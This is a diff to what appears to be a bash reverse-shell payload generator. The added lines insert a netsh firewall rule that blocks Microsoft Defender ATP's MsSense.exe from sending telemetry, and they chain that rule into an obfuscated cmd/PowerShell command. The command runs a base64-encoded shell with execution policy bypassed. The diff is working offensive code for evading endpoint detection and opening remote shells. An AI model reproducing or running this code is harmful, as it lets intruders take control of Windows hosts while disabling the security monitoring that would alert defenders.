@@ -678,7 +678,8 @@ fi
         exit;;
     esac
 
-    
+#Block Defender ATP from phoning home
+mssense="&& netsh a f a r n=\"nonsense\" d=out a=block prog=\"%programfiles%\Windows Defender Advanced Threat Protection\MsSense.exe\" e=yes"
 
 
 if [[ $4 == "udp" ]]
@@ -693,7 +694,7 @@ else
 fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
-rev="cmd /c \"set ${pwsh}=${pw_sh} && set ${space}=\" \" && call %${pwsh}%%${space}%${win}%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${shell}\""
+rev="cmd /c \"set ${pwsh}=${pw_sh} && set ${space}=\" \" $mssense && call %${pwsh}%%${space}%${win}%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${shell}\""
 
 
 if [[ $5 == "vba" ]] 
